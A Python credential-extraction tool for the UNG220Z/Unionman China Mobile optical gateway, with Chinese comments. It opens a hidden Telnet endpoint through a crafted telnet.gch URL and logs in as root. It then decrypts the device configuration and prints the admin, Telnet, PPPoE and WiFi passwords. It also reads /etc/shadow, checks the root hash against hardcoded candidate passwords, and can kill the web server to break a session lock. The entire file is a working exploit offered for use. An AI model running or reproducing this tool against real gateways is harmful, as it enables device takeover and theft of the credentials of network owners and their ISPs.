#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ung220z.py —— UNG220Z / Unionman 中国移动网关 凭据提取工具

流程
  1. 询问网关地址、普通账户、密码
  2. 补全 http://<ip>/usr=<user>&psw=<pass>&cmd=1&telnet.gch 并发送给浏览器，开启 Telnet
  3. 走 Telnet 通道登录（全程不建立 Web 会话，避免把管理页锁死）
  4. 解密配置库，提取全部凭据
  5. 按 [HH:MM:SS] TAG 格式打印日志，并落盘

用法
  python3 ung220z.py
  python3 ung220z.py -i 192.168.1.1 -u user -p 'xxxx' --no-browser
"""
import argparse
import getpass
import os
import random
import re
import select
import shutil
import socket
import subprocess
import sys
import time
import unicodedata
import urllib.error
import urllib.parse
import urllib.request
import webbrowser

IAC, DONT, DO, WONT, WILL, SB, SE = 255, 254, 253, 252, 251, 250, 240
TELNET_USER = "CMCCAdmin"
TELNET_PW = ""   # 留空则只用你输入的密码尝试，或用 --telnet-password 指定
CFG_ENC = "/userconfig/cfg/db_user_cfg.xml"
CFG_DEC = "/tmp/debug-decry-cfg"
PLACEHOLDER_PSK = "!@#$%12345"

_logfh = None


def log(tag, msg):
    line = "[%s] %-6s %s" % (time.strftime("%H:%M:%S"), tag, msg)
    print(line, flush=True)
    if _logfh:
        _logfh.write(line + "\n")
        _logfh.flush()


def dwidth(s):
    return sum(2 if unicodedata.east_asian_width(c) in "WF" else 1 for c in s)


def pad(s, width):
    return s + " " * max(0, width - dwidth(s))


# ─────────────────────────────── HTTP ───────────────────────────────
def _decode(raw):
    """光猫 Web 页常见为 GBK，纯 utf-8 会解成乱码并让关键字匹配失效。"""
    for enc in ("utf-8", "gbk", "gb18030"):
        try:
            return raw.decode(enc)
        except UnicodeDecodeError:
            continue
    return raw.decode("utf-8", "replace")


def http_get(url, timeout=8):
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 Chrome/120"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return _decode(r.read())
    except urllib.error.HTTPError as e:
        # 部分固件用 4xx/5xx 状态码返回正常页面，body 仍然有效
        return _decode(e.read() or b"")


def http_post(url, data, timeout=8):
    req = urllib.request.Request(url, data=data.encode(),
                                 headers={"User-Agent": "Mozilla/5.0 Chrome/120",
                                          "Referer": url})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, _decode(r.read())
    except urllib.error.HTTPError as e:
        return e.code, _decode(e.read() or b"")


def probe_port(ip, port, timeout=3):
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((ip, port))
        return True
    except Exception:
        return False
    finally:
        s.close()


def release_session(ip):
    """POST setlang.gch logout=1，释放可能残留的单会话锁。"""
    try:
        st, body = http_post("http://%s/setlang.gch" % ip, "logout=1")
        return st == 200
    except Exception:
        return False


def web_state(ip):
    """ok / busy / down"""
    try:
        body = http_get("http://%s/" % ip, timeout=6)
    except Exception:
        return "down"
    if "其他用户" in body:
        return "busy"
    return "ok"


def unlock_web(ip, tn):
    """kill httpd 清掉单会话锁，父进程 pc 会自动拉起。"""
    pid = None
    for ln in tn.run("ps").splitlines():
        if "httpd" in ln:
            pid = ln.split()[0]
            break
    if not pid:
        log("WARN", "未找到 httpd 进程")
        return False
    log("WARN", "检测到会话锁，重启 httpd (pid %s)" % pid)
    tn.run("kill %s" % pid)
    for _ in range(12):
        time.sleep(1)
        st = web_state(ip)
        if st != "down":
            log("INFO", "httpd 已恢复，Web 状态 → %s" % st)
            return st == "ok"
    return False


def enable_telnet(ip, user, pw, open_browser=True, timeout=8):
    base = "http://%s/" % ip
    raw = "%susr=%s&psw=%s&cmd=1&telnet.gch" % (base, user, pw)
    variants = [
        raw,
        "%susr=%s&psw=%s&cmd=1&telnet.gch" % (base, urllib.parse.quote(user),
                                              urllib.parse.quote(pw, safe="")),
        "%s?usr=%s&psw=%s&cmd=1&telnet.gch" % (base, user, urllib.parse.quote(pw, safe="")),
    ]
    if open_browser:
        try:
            opened = webbrowser.open(raw)
            log("HTTP", "已发送给浏览器%s: http://%s/usr=%s&psw=***&cmd=1&telnet.gch"
                % ("" if opened else "（无可用浏览器，改由脚本直连）", ip, user))
        except Exception as e:
            log("WARN", "浏览器调用失败: %s" % e)
    for url in variants:
        try:
            body = http_get(url, timeout=timeout)
        except Exception as e:
            log("WARN", "telnet.gch 请求失败: %s" % e)
            continue
        if "Success" in body:
            log("HTTP", "telnet.gch → TelnetSet Success!")
            return True
        txt = re.sub(r"<[^>]+>", " ", body).strip()
        log("HTTP", "telnet.gch → %s" % (txt[:60] if txt else "空响应"))
    return False


# ─────────────────────────────── Telnet ───────────────────────────────
def _parse(buf):
    out, rep, i = bytearray(), bytearray(), 0
    while i < len(buf):
        b = buf[i]
        if b == IAC and i + 1 < len(buf):
            cmd = buf[i + 1]
            if cmd == IAC:            # IAC IAC = 转义的 0xFF 数据字节
                out.append(IAC)
                i += 2
                continue
            if cmd in (DO, DONT, WILL, WONT) and i + 2 < len(buf):
                rep += bytes([IAC, WONT if cmd == DO else DONT, buf[i + 2]])
                i += 3
                continue
            if cmd == SB:
                j = buf.find(bytes([IAC, SE]), i + 2)
                i = (j + 2) if j != -1 else len(buf)
                continue
            i += 2
            continue
        out.append(b)
        i += 1
    return bytes(out).decode("utf-8", "replace"), bytes(rep)


class Telnet:
    def __init__(self, ip, port=23, timeout=8):
        self.s = socket.create_connection((ip, port), timeout=timeout)
        self.s.setblocking(False)
        self.buf = ""

    def _recv(self, timeout):
        r, _, _ = select.select([self.s], [], [], timeout)
        if not r:
            return False
        try:
            data = self.s.recv(8192)
        except BlockingIOError:
            return False
        if not data:
            return False
        txt, rep = _parse(data)
        if rep:
            self.s.sendall(rep)
        self.buf += txt
        return True

    def read_until(self, token, timeout=10):
        end = time.time() + timeout
        while time.time() < end:
            if token in self.buf:
                return self.buf
            self._recv(0.3)
        return self.buf

    def read_until_any(self, tokens, timeout=10):
        end = time.time() + timeout
        while time.time() < end:
            for t in tokens:
                if t in self.buf:
                    return t
            self._recv(0.3)
        return None

    def send(self, line):
        self.s.sendall(line.encode() + b"\r\n")

    def login(self, user, passwords):
        self.read_until_any(["Login:", "login:", "Username:"], 8)
        for pw in passwords:
            self.buf = ""
            self.send(user)
            got = self.read_until_any(["Password:", "password:", "incorrect"], 8)
            if "assword" not in (got or ""):
                log("AUTH", "Telnet 用户名 %s 不可用" % user)
                return False
            self.buf = ""
            self.send(pw)
            got = self.read_until_any(["/ #", "incorrect", "Login:"], 8)
            if got == "/ #":
                log("AUTH", "Telnet %s / %s → 登录成功（root）" % (user, "***"))
                return True
            log("AUTH", "Telnet %s / %s → refused" % (user, "***"))
        return False

    def run(self, cmd, timeout=15):
        """执行命令并回收输出。

        用随机 marker 定界，避免配置内容里恰好出现固定字符串导致截断；
        同时剔除 tty 回显的命令行、提示符和 echo 语句本身。
        """
        self.buf = ""
        tag = "__X%08x__" % random.getrandbits(32)
        self.send(cmd)
        time.sleep(0.35)
        self.send("echo %s" % tag)
        out = self.read_until(tag, timeout).split(tag)[0]
        cmdline = cmd.strip()
        lines = []
        for ln in out.splitlines():
            s = ln.strip()
            if not s or s.startswith("/ #") or s.startswith("# "):
                continue
            if s == cmdline:
                continue
            if s.startswith("echo ") and tag in s:
                continue
            lines.append(ln.rstrip())
        return "\n".join(lines).strip()

    def close(self):
        try:
            self.s.close()
        except Exception:
            pass


# ─────────────────────────────── 配置解析 ───────────────────────────────
class Cfg:
    r"""解密后的配置库。

    只 cat 一次整份文件在本地切表：`sed -n '/<Tbl name="X"/,/<\/Tbl>/p'`
    在 XML 被压成单行时区间地址失效，会把整份文档当成一张表返回，
    导致 PPPoE / WiFi 行被误读成 Web 账号。
    """

    def __init__(self, tn, timeout=90):
        self.tn = tn
        self.timeout = timeout
        self._raw = None

    def raw(self):
        if self._raw is None:
            self._raw = self.tn.run("cat %s" % CFG_DEC, timeout=self.timeout)
        return self._raw

    def table(self, name):
        m = re.search(r'<Tbl name="%s"[^>]*>(.*?)</Tbl>' % re.escape(name),
                      self.raw(), re.S)
        return m.group(1) if m else ""

    def rows(self, name):
        return parse_rows(self.table(name))

    def scalar(self, key):
        m = re.search(r'<DM name="%s" val="([^"]*)"' % re.escape(key), self.raw())
        return m.group(1) if m else None


def parse_rows(text):
    rows = []
    for blk in re.findall(r'<Row No="\d+">(.*?)</Row>', text, re.S):
        rows.append(dict(re.findall(r'<DM name="([A-Za-z_0-9]+)" val="([^"]*)"', blk)))
    return rows


def crack_root(hashed, candidates):
    if not shutil.which("openssl"):
        log("WARN", "未找到 openssl，跳过 root 口令比对")
        return None
    algo = "-5" if hashed.startswith("$5$") else "-6"
    salt = hashed.split("$")[2] if hashed.count("$") >= 3 else ""
    for pw in candidates:
        try:
            out = subprocess.run(["openssl", "passwd", algo, "-salt", salt, pw],
                                 capture_output=True, text=True, timeout=5).stdout.strip()
        except FileNotFoundError:
            log("WARN", "openssl 不可执行，跳过 root 口令比对")
            return None
        except Exception as e:
            log("WARN", "openssl 调用失败: %s" % e)
            return None
        if out == hashed:
            return pw
    return None


# ─────────────────────────────── 主流程 ───────────────────────────────
def main():
    global _logfh
    ap = argparse.ArgumentParser(description="UNG220Z 凭据提取")
    ap.add_argument("-i", "--ip", default=None, help="光猫地址，默认 192.168.1.1")
    ap.add_argument("-u", "--user", default=None, help="登录用户名，默认 user")
    ap.add_argument("-p", "--password", default=None, help="登录密码（不填则交互输入）")
    ap.add_argument("--no-browser", action="store_true", help="不调用浏览器，直接 HTTP 请求")
    ap.add_argument("--no-release", action="store_true", help="不尝试释放残留 Web 会话")
    ap.add_argument("--telnet-user", default=TELNET_USER, help="Telnet 用户名，默认 CMCCAdmin")
    ap.add_argument("--telnet-password", default=None, help="Telnet 口令（部分机型与 Web 口令不同）")
    ap.add_argument("--telnet-port", type=int, default=23, help="Telnet 端口，默认 23")
    ap.add_argument("--timeout", type=float, default=8.0, help="单次网络操作超时秒数，默认 8")
    ap.add_argument("--unlock", action="store_true", help="Web 被会话锁占住时，重启 httpd 解锁")
    a = ap.parse_args()

    logfile = "ung220z_%s.log" % time.strftime("%Y%m%d_%H%M%S")
    try:
        _logfh = open(logfile, "w", encoding="utf-8")
        try:
            os.chmod(logfile, 0o600)
        except OSError:
            pass
    except OSError as e:
        _logfh = None
        print("[WARN] 日志文件创建失败(%s)，仅屏幕输出" % e, file=sys.stderr)

    # ── 交互提示：先说用户名，再说密码 ──
    print()
    print("  ※ 用户名和密码通常印在光猫【背面贴纸】上（S/N 标签）")
    print("    形如「用户名：user   密码：xxxxxxxx」，把光猫翻过来就能看到")
    print(flush=True)

    ip = (a.ip or "").strip() or input("① 光猫地址 [192.168.1.1]: ").strip() or "192.168.1.1"
    user = (a.user or "").strip() or input("② 用户名 [user]: ").strip() or "user"

    # 口令只裁掉换行，不能用 strip()：首尾空格可能是口令的一部分
    if a.password:
        pw = a.password.rstrip("\r\n")
    else:
        print("③ 密码（输入时不显示）", flush=True)
        if sys.stdin.isatty():
            pw = getpass.getpass("   密码: ").rstrip("\r\n")
        else:
            pw = input("   密码: ").rstrip("\r\n")

    if not pw:
        log("WARN", "密码为空，退出")
        print("\n没有输入密码，已退出。密码印在光猫背面的贴纸上。")
        if _logfh:
            _logfh.close()
            _logfh = None
        return 1

    tn = None
    try:
        log("INFO", "会话开始  目标=%s  账户=%s" % (ip, user))
        log("INFO", "日志文件 %s" % os.path.abspath(logfile))

        if not probe_port(ip, 80, a.timeout):
            log("PROBE", "TCP 80/%s → closed" % ip)
            log("WARN", "网关不可达，检查地址与网络")
            return 2
        log("PROBE", "TCP 80/%s → open" % ip)

        if not a.no_release:
            log("INFO", "释放残留 Web 会话 → %s" % ("ok" if release_session(ip) else "skip"))

        log("INFO", "补全 URL: http://%s/usr=%s&psw=***&cmd=1&telnet.gch" % (ip, user))
        enable_telnet(ip, user, pw, open_browser=not a.no_browser, timeout=a.timeout)

        if not probe_port(ip, a.telnet_port, a.timeout):
            log("PROBE", "TCP %d/%s → closed" % (a.telnet_port, ip))
            log("WARN", "Telnet 端口未开放（密码可能已轮换，重跑脚本）")
            return 3
        log("PROBE", "TCP %d/%s → open" % (a.telnet_port, ip))

        tn = Telnet(ip, port=a.telnet_port, timeout=a.timeout)
        cands = [x for x in (TELNET_PW, a.telnet_password) if x]
        if pw not in cands:
            cands.append(pw)
        if not tn.login(a.telnet_user, cands):
            log("WARN", "Telnet 登录失败，终止")
            return 4

        st = web_state(ip)
        log("PROBE", "Web 状态 → %s" % st)
        if st == "busy" and a.unlock:
            unlock_web(ip, tn)

        log("SHELL", "id → %s" % tn.run("id", timeout=a.timeout))
        log("SHELL", "uname -a → %s" % tn.run("uname -a", timeout=a.timeout))
        log("INFO", "Web 会话全程未占用（避免管理页被锁）")

        dec = tn.run("sidbg 1 DB decry %s" % CFG_ENC, timeout=max(20.0, a.timeout * 3))
        # `ls` 的报错同样落在 pty 上，非空输出不能代表文件存在
        mark = tn.run("test -s %s && echo __OK__ || echo __NO__" % CFG_DEC,
                      timeout=a.timeout)
        if "__OK__" not in mark:
            log("WARN", "配置解密失败（sidbg 返回: %s）" % (dec[:80] or "空"))
            return 5
        log("SHELL", "sidbg 1 DB decry %s → %s" % (CFG_ENC, CFG_DEC))

        cfg = Cfg(tn, timeout=max(90.0, a.timeout * 6))

        creds, wifi = {}, []
        for r in cfg.rows("DevAuthInfo"):
            lvl = r.get("Level")
            log("DATA", "DevAuthInfo  %-10s / %-18s  Level=%s" % (r.get("User"), r.get("Pass"), lvl))
            creds["web_admin" if lvl == "1" else "web_user"] = (r.get("User"), r.get("Pass"))

        for r in cfg.rows("TelnetUser"):
            log("DATA", "TelnetUser   %-10s / %-18s  Type=%s"
                % (r.get("Username"), r.get("Password"), r.get("Type")))

        ts_pw = cfg.scalar("TS_UPwd")
        if ts_pw:
            log("DATA", "TS_UPwd      %s / %s（实际 Telnet 口令）" % (TELNET_USER, ts_pw))
            creds["telnet"] = (TELNET_USER, ts_pw)

        for r in cfg.rows("WANCPPP"):
            if r.get("UserName"):
                log("DATA", "WANCPPP      %s / %s" % (r["UserName"], r.get("Password")))
                creds["pppoe"] = (r["UserName"], r.get("Password"))

        essid = {}
        for r in cfg.rows("WLANCfg"):
            if r.get("ESSID"):
                essid[r.get("ViewName", "")] = r["ESSID"]
        for r in cfg.rows("WLANPSK"):
            psk = r.get("KeyPassphrase")
            if not psk:
                continue
            vn = r.get("ViewName", "")
            base_vn = vn.rsplit(".PSK", 1)[0]
            ssid = essid.get(base_vn, vn)
            log("DATA", "WLANPSK      %-22s SSID=%-14s PSK=%s" % (vn, ssid, psk))
            wifi.append((ssid, psk))

        shadow = tn.run("grep root /etc/shadow | head -1", timeout=a.timeout)
        m = re.search(r"root:(\$[0-9]\$[^:]+):", shadow)
        if m:
            root_pw = crack_root(m.group(1), ["aDm8H%MdA", "admin", "root", "123456", "CMCCAdmin"])
            if root_pw:
                log("CRACK", "MATCH: %s  (/etc/shadow)" % root_pw)
                creds["root"] = ("root", root_pw)
            else:
                log("DATA", "root 哈希 %s…（常见口令未命中）" % m.group(1)[:32])
                creds["root"] = ("root", m.group(1))

        # ── 汇总 ──
        print("\n" + "═" * 66)
        print(" 凭据汇总    %s" % ip)
        print("═" * 66)
        labels = [("telnet", "Telnet / root shell"), ("web_admin", "Web 超管"),
                  ("web_user", "Web 普通用户"), ("pppoe", "PPPoE 宽带"), ("root", "Linux root")]
        for key, lab in labels:
            if key in creds:
                u, p = creds[key]
                print("  %s %s %s" % (pad(lab, 22), pad(u, 14), p))
        for ssid, psk in wifi:
            note = "  (出厂占位)" if psk == PLACEHOLDER_PSK else ""
            print("  %s %s %s%s" % (pad("WiFi " + ssid, 22), pad("", 14), psk, note))
        print("═" * 66)
        log("INFO", "完成。口令每 15 分钟轮换，重跑本脚本即可取新值")
        return 0
    except KeyboardInterrupt:
        log("WARN", "用户中断")
        return 130
    except Exception as e:
        log("WARN", "%s: %s" % (e.__class__.__name__, e))
        return 1
    finally:
        if tn is not None:
            # 设备上不留明文配置（内含全部口令）
            try:
                tn.run("rm -f %s" % CFG_DEC, timeout=a.timeout)
                log("INFO", "已清理设备侧 %s" % CFG_DEC)
            except Exception:
                pass
            tn.close()
        if _logfh:
            _logfh.close()
            _logfh = None


if __name__ == "__main__":
    sys.exit(main())
